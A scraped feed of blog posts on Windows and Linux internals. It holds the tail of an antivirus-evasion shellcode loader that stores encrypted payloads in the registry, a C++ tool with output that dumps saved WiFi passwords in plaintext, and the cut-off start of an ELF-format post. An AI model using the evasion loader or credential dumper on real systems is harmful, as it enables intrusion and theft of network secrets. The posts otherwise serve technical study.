free(encryptedShellcode); printf(\u0026#34;Successfully wrote encrypted payload to registry\\n\u0026#34;); // Read from registry BYTE* readBuffer = NULL; DWORD bytesRead; if (!readRegistry(\u0026amp;readBuffer, \u0026amp;bytesRead)) { return 1; } // Decrypt payload BYTE* decryptedShellcode = NULL; DWORD decryptedSize; if (!AESDecrypt(readBuffer, bytesRead, key, \u0026amp;decryptedShellcode, \u0026amp;decryptedSize)) { free(readBuffer); return 1; } free(readBuffer); // Verify decrypted size matches original if (decryptedSize != shellcodeSize) { printf(\u0026#34;Decrypted size mismatch! Expected %d, got %d\\n\u0026#34;, shellcodeSize, decryptedSize); free(decryptedShellcode); return 1; } // Execute the shellcode printf(\u0026#34;Executing decrypted payload...\\n\u0026#34;); ExecuteShellcode(decryptedShellcode, decryptedSize); free(decryptedShellcode); return 0; } Profit? Alright, let\u0026rsquo;s check the scoreboard. Are we able to successfully read and write to the registry and execute shellcode without Windows Defender complaining?\nLooks good. Let\u0026rsquo;s see how many antivirus vendors detect our code. Ahh, only ten out of 72! That\u0026rsquo;s not bad. But we could also do better!\nNext post!\nProof of concept: RegistryGhost\nhttps://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://stackoverflow.com/a/26414236\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://ntdoc.m417z.com/ntcreatethreadex\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://learn.microsoft.com/en-us/windows/win32/api/bcrypt/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://learn.microsoft.com/en-us/windows/win32/api/winreg/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://hexagram.foo/posts/bypassing-windows-defender/","summary":"\u003cp\u003eLately I\u0026rsquo;ve been poking around at Windows internals and writing low level code. This morning I thought I\u0026rsquo;d try to bypass Windows Defender \u003cem\u003eand\u003c/em\u003e get a low score on Virus Total.\u003c/p\u003e\n\u003cp\u003eOne trick I’ve been playing with is writing shellcode to the Windows registry to keep things “fileless.” It’s not super fancy, but it’s kind of neat. I combined that with indirect syscalls and some cryptographic routines to get Windows Defender to chill out.\u003c/p\u003e","title":"Bypassing Windows Defender"},{"content":"wifiExtract The other day my grandmother forgot her Windows WiFi SSID and password when she wanted to share it with a friend. So I thought if I could just automate the retrieval of her wireless profiles, she would never forget them again in the future.\nIt turns out, the Windows API offers a nice way to enumerate WLAN information. First, we open a handle to the WLAN system by first calling the WlanOpenHandle function, which we can then use to enumerate WLAN interfaces with the WlanEnumInterfaces function. 1\nDWORD WlanEnumInterfaces( [in] HANDLE hClientHandle, [in] PVOID pReserved, [out] PWLAN_INTERFACE_INFO_LIST *ppInterfaceList ); Once we\u0026rsquo;ve found a wireless network interface, we can iterate through its profiles. WLAN profiles are stored in XML format. We can see an example profile here.\n\u0026gt;type %SYSTEMDRIVE%\u0026#34;\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces\\{FA6CC5AF-E3EC-4CDB-A7E9-014E5352F6FA}\\{A181B5A9-A72D-445B-948A-DA29AC041866}.xml\u0026#34; \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;WLANProfile xmlns=\u0026#34;http://www.microsoft.com/networking/WLAN/profile/v1\u0026#34;\u0026gt; \u0026lt;name\u0026gt;networked\u0026lt;/name\u0026gt; \u0026lt;SSIDConfig\u0026gt; \u0026lt;SSID\u0026gt; \u0026lt;hex\u0026gt;6E6574776F726B6564\u0026lt;/hex\u0026gt; \u0026lt;name\u0026gt;networked\u0026lt;/name\u0026gt; \u0026lt;/SSID\u0026gt; \u0026lt;nonBroadcast\u0026gt;false\u0026lt;/nonBroadcast\u0026gt; \u0026lt;/SSIDConfig\u0026gt; \u0026lt;connectionType\u0026gt;ESS\u0026lt;/connectionType\u0026gt; \u0026lt;connectionMode\u0026gt;manual\u0026lt;/connectionMode\u0026gt; \u0026lt;MSM\u0026gt; \u0026lt;security\u0026gt; \u0026lt;authEncryption\u0026gt; \u0026lt;authentication\u0026gt;WPA2PSK\u0026lt;/authentication\u0026gt; \u0026lt;encryption\u0026gt;AES\u0026lt;/encryption\u0026gt; \u0026lt;useOneX\u0026gt;false\u0026lt;/useOneX\u0026gt; \u0026lt;/authEncryption\u0026gt; \u0026lt;sharedKey\u0026gt; \u0026lt;keyType\u0026gt;passPhrase\u0026lt;/keyType\u0026gt; \u0026lt;protected\u0026gt;true\u0026lt;/protected\u0026gt; \u0026lt;keyMaterial\u0026gt;01000000D08C9DDF0115D1118C7A00C04FC297EB01000000C3D1445ECDFED24C989C1BE14BC7ABF5000000000200000000001066000000010000200000007F040AECC06A879362E949BAB5C2810179CABF3300DA399698E4E9D0F8814DD3000000000E80000000020000200000002C48A4A12EABFC325564EC54E086C181A46707218CF19C65151D89430EF5466010000000CC8C4E3C6AACC202F85168DD75B291A5400000004E136AF57200DD275D323E73BBEB2AEABF7AFA8BFEC60B0DA56972203222ABA576E751BF5F5B678CB367A2D6E6272BC691ACCEABDF3959B932EB1C9EE5426065\u0026lt;/keyMaterial\u0026gt; \u0026lt;/sharedKey\u0026gt; \u0026lt;/security\u0026gt; \u0026lt;/MSM\u0026gt; \u0026lt;/WLANProfile\u0026gt; For each WLAN profile, we try to locate the \u0026lt;keyMaterial\u0026gt; tags, which contain the SSID\u0026rsquo;s passphrase, and get its value.\nBut we have to account for the size of the \u0026lt;keyMaterial\u0026gt; tag itself when we do our check. So, when we find the tag, we add the size (13) to the beginning marker, as well as subtract the size of the ending marker—ensuring we only extract the passphrase within the key material tags and not any strings or characters from the tags themselves.\nAltogether, for each WLAN profile we find, we use WlanGetProfile to acquire the SSID, aka the profileName, and its related passphrase.\nDWORD WlanGetProfile( [in] HANDLE hClientHandle, [in] const GUID *pInterfaceGuid, [in] LPCWSTR strProfileName, [in] PVOID pReserved, [out] LPWSTR *pstrProfileXml, [in, out, optional] DWORD *pdwFlags, [out, optional] DWORD *pdwGrantedAccess ); We decrypt the passphrase on-the-fly by appending the GET_PLAINTEXT_KEY flag to the WlanGetProfile2 function call.\nfor (DWORD i = 0; i \u0026lt; plist-\u0026gt;dwNumberOfItems; ++i) { const WLAN_INTERFACE_INFO\u0026amp; interface_info = plist-\u0026gt;InterfaceInfo[i]; PWLAN_PROFILE_INFO_LIST profileList = NULL; result = WlanGetProfileList(hClient, \u0026amp;interface_info.InterfaceGuid, NULL, \u0026amp;profileList); if (result != ERROR_SUCCESS) { error(\u0026#34;WlanGetProfileList failed: \u0026#34; + std::to_string(result)); continue; } for (DWORD j = 0; j \u0026lt; profileList-\u0026gt;dwNumberOfItems; ++j) { const WLAN_PROFILE_INFO\u0026amp; profileInfo = profileList-\u0026gt;ProfileInfo[j]; std::wstring profileName(profileInfo.strProfileName); LPWSTR xmlProfile = NULL; DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY; result = WlanGetProfile(hClient, \u0026amp;interface_info.InterfaceGuid, profileName.c_str(), NULL, \u0026amp;xmlProfile, \u0026amp;flags, NULL); if (result != ERROR_SUCCESS) { error(\u0026#34;WlanGetProfile failed: \u0026#34; + std::to_string(result)); continue; } std::wstring profileXml(xmlProfile); size_t key = profileXml.find(L\u0026#34;\u0026lt;keyMaterial\u0026gt;\u0026#34;); if (key != std::wstring::npos) { size_t keyEnd = profileXml.find(L\u0026#34;\u0026lt;/keyMaterial\u0026gt;\u0026#34;, key); if (keyEnd != std::wstring::npos) { std::wstring keyContent = profileXml.substr(key + 13, keyEnd - (key + 13)); std::wcout \u0026lt;\u0026lt; L\u0026#34;[+] Found Wifi Profile:\u0026#34; \u0026lt;\u0026lt; std::endl; std::wcout \u0026lt;\u0026lt; L\u0026#34;[+] SSID: \u0026#34; \u0026lt;\u0026lt; profileName \u0026lt;\u0026lt; std::endl; std::wcout \u0026lt;\u0026lt; L\u0026#34;[+] Key: \u0026#34; \u0026lt;\u0026lt; keyContent \u0026lt;\u0026lt; std::endl; std::wcout \u0026lt;\u0026lt; L\u0026#34; \u0026#34; \u0026lt;\u0026lt; std::endl; } } else { std::wcout \u0026lt;\u0026lt; L\u0026#34;[+] Found Wifi Profile:\u0026#34; \u0026lt;\u0026lt; std::endl; std::wcout \u0026lt;\u0026lt; L\u0026#34;[+] SSID: \u0026#34; \u0026lt;\u0026lt; profileName \u0026lt;\u0026lt; std::endl; std::wcout \u0026lt;\u0026lt; L\u0026#34;[+] No key material found\u0026#34; \u0026lt;\u0026lt; std::endl; std::wcout \u0026lt;\u0026lt; L\u0026#34; \u0026#34; \u0026lt;\u0026lt; std::endl; } // snipped \u0026gt;msbuild wifiExtract\\wifiExtract\\wifiExtract.vcxproj MSBuild version 17.13.19+0d9f5a35a for .NET Framework Build started 3/19/2025 11:49:09 PM. Project \u0026#34;C:\\Users\\augur\\source\\repos\\wifiExtract\\wifiExtract\\wifiExtract.vcxproj\u0026#34; on node 1 (default targets) . PrepareForBuild: Structured output is enabled. The formatting of compiler diagnostics will reflect the error hierarchy. See https://aka.ms/cpp/structured-output for more details. InitializeBuildStatus: Creating \u0026#34;wifiExtract\\Debug\\wifiExtract.tlog\\unsuccessfulbuild\u0026#34; because \u0026#34;AlwaysCreate\u0026#34; was specified. Touching \u0026#34;wifiExtract\\Debug\\wifiExtract.tlog\\unsuccessfulbuild\u0026#34;. ClCompile: C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.43.34808\\bin\\HostX86\\x86\\CL.exe /c /ZI /JMC /nologo /W3 /WX- /diagnostics:column /sdl /Od /Oy- /D WIN32 /D _DEBUG /D _CONSOLE /D _UNICODE /D UNICODE /Gm- /EHsc /RTC1 /MDd /GS /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline /permissive- /Fo\u0026#34;wifiExtr act\\Debug\\\\\u0026#34; /Fd\u0026#34;wifiExtract\\Debug\\vc143.pdb\u0026#34; /external:W3 /Gd /TP /analyze- /FC /errorReport:queue wifiExt ract.cpp wifiExtract.cpp Link: C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.43.34808\\bin\\HostX86\\x86\\link.exe /ERRORREPORT:QUEUE /OUT:\u0026#34;C:\\Users\\augur\\source\\repos\\wifiExtract\\wifiExtract\\Debug\\wifiExtract.exe\u0026#34; /INCREM ENTAL /ILK:\u0026#34;wifiExtract\\Debug\\wifiExtract.ilk\u0026#34; /NOLOGO kernel32.lib user32.lib gdi32.lib winspool.lib comdl g32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /MANIFEST /MANIFES TUAC:\u0026#34;level=\u0026#39;asInvoker\u0026#39; uiAccess=\u0026#39;false\u0026#39;\u0026#34; /manifest:embed /DEBUG /PDB:\u0026#34;C:\\Users\\augur\\source\\repos\\wifiExtr act\\wifiExtract\\Debug\\wifiExtract.pdb\u0026#34; /SUBSYSTEM:CONSOLE /TLBID:1 /DYNAMICBASE /NXCOMPAT /IMPLIB:\u0026#34;C:\\Users \\augur\\source\\repos\\wifiExtract\\wifiExtract\\Debug\\wifiExtract.lib\u0026#34; /MACHINE:X86 wifiExtract\\Debug\\wifiExtra ct.obj wifiExtract.vcxproj -\u0026gt; C:\\Users\\augur\\source\\repos\\wifiExtract\\wifiExtract\\Debug\\wifiExtract.exe FinalizeBuildStatus: Deleting file \u0026#34;wifiExtract\\Debug\\wifiExtract.tlog\\unsuccessfulbuild\u0026#34;. Touching \u0026#34;wifiExtract\\Debug\\wifiExtract.tlog\\wifiExtract.lastbuildstate\u0026#34;. Done Building Project \u0026#34;C:\\Users\\augur\\source\\repos\\wifiExtract\\wifiExtract\\wifiExtract.vcxproj\u0026#34; (default targ ets). Build succeeded. 0 Warning(s) 0 Error(s) Time Elapsed 00:00:06.61 \u0026gt;wifiExtract.exe [+] Found Wifi Profile: [+] SSID: openNet [+] No key material found [+] Found Wifi Profile: [+] SSID: networked [+] Key: password123 wifiExtract on GitHub.\nhttps://learn.microsoft.com/en-us/windows/win32/api/wlanapi/nf-wlanapi-wlanenuminterfaces\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://learn.microsoft.com/en-us/windows/win32/api/wlanapi/nf-wlanapi-wlangetprofile\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://hexagram.foo/posts/extracting-windows-wifi-profiles/","summary":"\u003ch2 id=\"wifiextract\"\u003ewifiExtract\u003c/h2\u003e\n\u003cp\u003eThe other day my grandmother forgot her Windows WiFi SSID and password when she wanted to share it with a friend. So I thought if I could just automate the retrieval of her wireless profiles, she would never forget them again in the future.\u003c/p\u003e\n\u003cp\u003eIt turns out, the Windows API offers a nice way to enumerate WLAN information. First, we open a handle to the WLAN system by first calling the \u003ccode\u003eWlanOpenHandle\u003c/code\u003e function, which we can then use to enumerate WLAN interfaces with the \u003ccode\u003eWlanEnumInterfaces\u003c/code\u003e function. \u003csup id=\"fnref:1\"\u003e\u003ca href=\"#fn:1\" class=\"footnote-ref\" role=\"doc-noteref\"\u003e1\u003c/a\u003e\u003c/sup\u003e\u003c/p\u003e","title":"Extracting Windows WiFi Profiles"},{"content":"Elfland Lately I\u0026rsquo;ve been thinking about Linux internals and malware. In this blog post, we\u0026rsquo;re going to hark about the ELFs. Just as Windows has its own executable format, so too does Linux.\nIf we look at the source code1 to the Executable and Linkable Format specification in elf.h, we can see the definition of the ELF header and some of its core machinery to get an idea of how it works.\ntypedef struct elf64_hdr { unsigned char e_ident[EI_NIDENT]; /* ELF \u0026#34;magic number\u0026#34; */ Elf64_Half e_type; Elf64_Half e_machine; Elf64_Word e_version; Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; Elf64_Half e_ehsize; Elf64_Half e_phentsize; Elf64_Half e_phnum; Elf64_Half e_shentsize; Elf64_Half e_shnum; Elf64_Half e_shstrndx; } Elf64_Ehdr; /* These constants define the permissions on sections in the program header, p_flags. */ #define PF_R 0x4 #define PF_W 0x2 #define PF_X 0x1 typedef struct elf64_phdr { Elf64_Word p_type; Elf64_Word p_flags; Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment, file \u0026amp; memory */ } Elf64_Phdr; typedef struct elf64_shdr { Elf64_Word sh_name; /* Section name, index in string table */ Elf64_Word sh_type; /* Type of section */ Elf64_Xword sh_flags; /* Miscellaneous section attributes */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Size of section in bytes */ Elf64_Word sh_link; /* Index of another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */ } Elf64_Shdr; typedef struct elf64_note { Elf64_Word n_namesz; /* Name size */ Elf64_Word n_descsz; /* Content size */ Elf64_Word n_type; /* Content type */ } Elf64_Nhdr; typedef struct elf64_sym { Elf64_Word st_name; /* Symbol name, index in string tbl */ unsigned char st_info; /* Type and binding attributes */ unsigned char st_other; /* No defined meaning, 0 */ Elf64_Half st_shndx; /* Associated section index */ Elf64_Addr st_value; /* Value of the symbol */ Elf64_Xword st_size; /* Associated symbol size */ } Elf64_Sym; \u0026ldquo;OK, so what?\u0026rdquo; We\u0026rsquo;re interested in how the elf64_hdr works. And it turns out it essentially uses a lookup table. The offset to the program header table is located in e_phoff. The program header table itself is defined by various elf64_phdr segments.\nAdditionally, elf64_shdr section headers hold data, variables, and linking information2:\n.text for code instructions, .rodata for read-only data, .plt for the procedure linkage table, .data segment for initialized data, .bss section for uninitialized variables, .got.plt section for dynamic interactions between the global offset table and procedure linkage table, .dynsym for dynamic symbols imported from shared libraries, .dynstr for dynamic strings, .rel for relocation symbols, .hash for hash table lookups, .symtab for all symbols, .strtab for a string table, .shstrtab for a table to resolve the names of each of the tables themselves, .ctors and .dtors - constructors and destructors - function pointers for initialization and finalization sequences before any code in the main body of the program executes. However, many of these section headers aren\u0026rsquo;t actually necessary for execution and can be stripped out from the binary. They mostly hold information for linking and debugging purposes.\nOur primary interest is in the elf64_phdr table segments. This table controls what should or shouldn\u0026rsquo;t be loaded into memory at runtime.3 When an ELF file is executed, it gets mapped4 by mmap according to whatever is specified by the ELF file program headers.\nLoading If we take a look with strace we can see a bit about how binaries are loaded and executed.\n$ strace /usr/bin/ls execve(\u0026#34;/usr/bin/ls\u0026#34;, [\u0026#34;ls\u0026#34;], 0x7ffcba885000 /* 24 vars */) = 0 brk(NULL) = 0x5dca6c78b000 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x749cec0f8000 access(\u0026#34;/etc/ld.so.preload\u0026#34;, R_OK) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \u0026#34;/etc/ld.so.cache\u0026#34;, O_RDONLY|O_CLOEXEC) = 3 fstat(3, {st_mode=S_IFREG|0644, st_size=64795, ...}) = 0 mmap(NULL, 64795, PROT_READ, MAP_PRIVATE, 3, 0) = 0x749cec0e8000 close(3) = 0 openat(AT_FDCWD, \u0026#34;/lib/x86_64-linux-gnu/libselinux.so.1\u0026#34;, O_RDONLY|O_CLOEXEC) = 3 read(3, \u0026#34;\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u0026gt;\\0\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\u0026#34;..., 832) = 832 fstat(3, {st_mode=S_IFREG|0644, st_size=174472, ...}) = 0 mmap(NULL, 181960, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x749cec0bb000 mmap(0x749cec0c1000, 118784, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x749cec0c1000 mmap(0x749cec0de000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x23000) = 0x749cec0de000 mmap(0x749cec0e4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x29000) = 0x749cec0e4000 mmap(0x749cec0e6000, 5832, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x749cec0e6000 close(3) = 0 openat(AT_FDCWD, \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;, O_RDONLY|O_CLOEXEC) = 3 read(3, \u0026#34;\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u0026gt;\\0\\1\\0\\0\\0\\220\\243\\2\\0\\0\\0\\0\\0\u0026#34;..., 832) = 832 pread64(3, \u0026#34;\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\u0026#34;..., 784, 64) = 784 fstat(3, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0 pread64(3, \u0026#34;\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\u0026#34;..., 784, 64) = 784 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x749cebe00000 mmap(0x749cebe28000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x749cebe28000 mmap(0x749cebfb0000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0x749cebfb0000 mmap(0x749cebfff000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1fe000) = 0x749cebfff000 mmap(0x749cec005000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x749cec005000 close(3) = 0 openat(AT_FDCWD, \u0026#34;/lib/x86_64-linux-gnu/libpcre2-8.so.0\u0026#34;, O_RDONLY|O_CLOEXEC) = 3 read(3, \u0026#34;\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u0026gt;\\0\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\u0026#34;..., 832) = 832 fstat(3, {st_mode=S_IFREG|0644, st_size=625344, ...}) = 0 mmap(NULL, 627472, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x749cec021000 mmap(0x749cec023000, 450560, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x749cec023000 mmap(0x749cec091000, 163840, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x70000) = 0x749cec091000 mmap(0x749cec0b9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x97000) = 0x749cec0b9000 close(3) = 0 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x749cec01e000 arch_prctl(ARCH_SET_FS, 0x749cec01e800) = 0 set_tid_address(0x749cec01ead0) = 86655 set_robust_list(0x749cec01eae0, 24) = 0 rseq(0x749cec01f120, 0x20, 0, 0x53053053) = 0 mprotect(0x749cebfff000, 16384, PROT_READ) = 0 mprotect(0x749cec0b9000, 4096, PROT_READ) = 0 mprotect(0x749cec0e4000, 4096, PROT_READ) = 0 mprotect(0x5dca4b2a4000, 8192, PROT_READ) = 0 mprotect(0x749cec130000, 8192, PROT_READ) = 0 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0 ... // snipped The kernel first calls execve, effectively forking the program by saying \u0026ldquo;replacing my current program with this one.\u0026rdquo;5\nThen a call is made to brk to locate the end of the data segment67. The ELF header then gets parsed8 to determine how to process the program headers and it is mapped into memory.\n// snippet from fs/binfmt_elf.c /** * load_elf_phdrs() - load ELF program headers * @elf_ex: ELF header of the binary whose program headers should be loaded * @elf_file: the opened ELF binary file * * Loads ELF program headers from the binary file elf_file, which has the ELF * header pointed to by elf_ex, into a newly allocated array. The caller is * responsible for freeing the allocated data. Returns NULL upon failure. */ static struct elf_phdr *load_elf_phdrs(const struct elfhdr *elf_ex, struct file *elf_file) { struct elf_phdr *elf_phdata = NULL; int retval = -1; unsigned int size; /* * If the size of this structure has changed, then punt, since * we will be doing the wrong thing. */ if (elf_ex-\u0026gt;e_phentsize != sizeof(struct elf_phdr)) goto out; /* Sanity check the number of program headers... */ /* ...and their total size. */ size = sizeof(struct elf_phdr) * elf_ex-\u0026gt;e_phnum; if (size == 0 || size \u0026gt; 65536 || size \u0026gt; ELF_MIN_ALIGN) goto out; elf_phdata = kmalloc(size, GFP_KERNEL); if (!elf_phdata) goto out; /* Read in the program headers */ retval = elf_read(elf_file, elf_phdata, size, elf_ex-\u0026gt;e_phoff); out: if (retval) { kfree(elf_phdata); elf_phdata = NULL; } return elf_phdata; } The ELF interpeter handles how the file is loaded. It resolves the symbols, segments, and necessary information to run the binary.\nIn this case, the dynamic linker ld.so is called since our binary is dynamically linked. This resolves the dependencies necessary for execution.\nAnd mmap gets called to allocate memory for all the necessary virtual memory mappings: the stack, heap, and anonymous mappings.\nFor each shared library the kernel needs, the loader uses mmap() to map the segments and each library into memory at the addresses specified by the ELF headers. Appropriate permissions are set. Relocations are processed by the linker9 and calls to mprotect set some memory locations into read-only mode. When the program is done executing, it calls unmap().\nAnd actually, a lot more than this happens. If we step through the program with gdb we see that strace is only giving us a high level overview.\nWe only see the syscalls. But execution of the run time dynamic linker actually begins at _dl_start within elf/rtld.c, and it\u0026rsquo;s much more sophisticated.10\n$ cat breakpoints.log | grep Breakpoint | cut -f3 -d\u0026#39; \u0026#39; | awk \u0026#39;!seen[$0]++\u0026#39; 0x00007ffff7fe4540 _dl_start elf_get_dynamic_info _dl_start_final _dl_setup_hash _dl_sysdep_start process_envvars _dl_new_object _dl_map_object_deps 0x00007ffff7fc7abe _dl_map_object _dl_map_object_from_fd _dl_relocate_object elf_machine_lazy_rel __GI_mprotect elf_machine_runtime_setup __GI_munmap We\u0026rsquo;ll save this matter for a different post. But for now, just know that our strace output is in no way an exhaustive or full explanation of all the things that occur to enable loading our ELF binary. Though it does give us a view of the system calls that occur, which is helpful for tracing and debugging, it still conceals a lot of implementation details.\nSegment Types For each ELF program header segment, the p_type field tells the kernel how to interpret the header. For reference: the elf64_phdr structure and possible p_type values.\ntypedef struct elf64_phdr { Elf64_Word p_type; Elf64_Word p_flags; Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment, file \u0026amp; memory */ } Elf64_Phdr; Type Value Description PT_NULL 0 Unused element PT_LOAD 1 Loadable segment described by p_filesz and p_memsz PT_DYNAMIC 2 Dynamic linking info PT_INTERP 3 Interpreter to invoke; usually ld PT_NOTE 4 Location and size of auxiliary info PT_SHLIB 5 Reserved PT_PHDR 6 Specifies location and size of program header table itself PT_TLS 7 Specifies a thread local storage template PT_LOPROC 0x70000000 Reserved PT_HIPROC 0x7fffffff Reserved For example, the PT_DYNAMIC segment specifies dynamic linking information. And the PT_INTERP segment specifies the interpreter to invoke. This is usually the dynamic linker ld.\n$ readelf -p .interp /usr/bin/ls String dump of section \u0026#39;.interp\u0026#39;: [ 0] /lib64/ld-linux-x86-64.so.2 But segments marked PT_LOAD denote loadable segments. PT_LOAD segments are described by the p_filesz and p_memsz fields.11 The bytes from PT_LOAD segments are mapped to the beginning of the memory segment. And later we will see that we actually have more granular control over where, exactly, things get mapped to via the p_vaddr field.\nIf we use readelf with the -l flag, we can see an ELF\u0026rsquo;s program headers and each of their respective permission Flags: read, write, or executable.\n$ readelf -l /usr/bin/ls Elf file type is DYN (Position-Independent Executable file) Entry point 0x6d30 There are 13 program headers, starting at offset 64 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align PHDR 0x0000000000000040 0x0000000000000040 0x0000000000000040 0x00000000000002d8 0x00000000000002d8 R 0x8 INTERP 0x0000000000000318 0x0000000000000318 0x0000000000000318 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x00000000000036f8 0x00000000000036f8 R 0x1000 LOAD 0x0000000000004000 0x0000000000004000 0x0000000000004000 0x0000000000014db1 0x0000000000014db1 R E 0x1000 LOAD 0x0000000000019000 0x0000000000019000 0x0000000000019000 0x00000000000071b8 0x00000000000071b8 R 0x1000 LOAD 0x0000000000020f30 0x0000000000021f30 0x0000000000021f30 0x0000000000001348 0x00000000000025e8 RW 0x1000 DYNAMIC 0x0000000000021a38 0x0000000000022a38 0x0000000000022a38 0x0000000000000200 0x0000000000000200 RW 0x8 NOTE 0x0000000000000338 0x0000000000000338 0x0000000000000338 0x0000000000000030 0x0000000000000030 R 0x8 NOTE 0x0000000000000368 0x0000000000000368 0x0000000000000368 0x0000000000000044 0x0000000000000044 R 0x4 GNU_PROPERTY 0x0000000000000338 0x0000000000000338 0x0000000000000338 0x0000000000000030 0x0000000000000030 R 0x8 GNU_EH_FRAME 0x000000000001e170 0x000000000001e170 0x000000000001e170 0x00000000000005ec 0x00000000000005ec R 0x4 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 RW 0x10 GNU_RELRO 0x0000000000020f30 0x0000000000021f30 0x0000000000021f30 0x00000000000010d0 0x00000000000010d0 R 0x1 Section to Segment mapping: Segment Sections... 00 01 .interp 02 .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 03 .init .plt .plt.got .plt.sec .text .fini 04 .rodata .eh_frame_hdr .eh_frame 05 .init_array .fini_array .data.rel.ro .dynamic .got .data .bss 06 .dynamic 07 .note.gnu.property 08 .note.gnu.build-id .note.ABI-tag 09 .note.gnu.property 10 .eh_frame_hdr 11 12 .init_array .fini_array .data.rel.ro .dynamic .got The program header we\u0026rsquo;re interested in is the NOTE segment. As you can see above, this particular header is not intended to be executable. By default it\u0026rsquo;s read-only. The PT_NOTE header specifies an auxiliary field for storing information. We can see its construction here.\nFor example, a software vendor might desire to mark an executable with information to indicate remarks about compatibility. Together, the PT_NOTE section consists of an array of 4-byte words.\n/* Note header in a PT_NOTE section */ typedef struct elf64_note { Elf64_Word n_namesz; /* Name size */ Elf64_Word n_descsz; /* Content size */ Elf64_Word n_type; /* Content type */ } Elf64_Nhdr; The sizes for all of the ELF\u0026rsquo;s corresponding types and sizes can be found in elf.h in almost any Linux repo.\n/* Standard ELF types. */ #include \u0026lt;stdint.h\u0026gt; /* Type for a 16-bit quantity. */ typedef uint16_t Elf32_Half; typedef uint16_t Elf64_Half; /* Types for signed and unsigned 32-bit quantities. */ typedef uint32_t Elf32_Word; typedef int32_t Elf32_Sword; typedef uint32_t 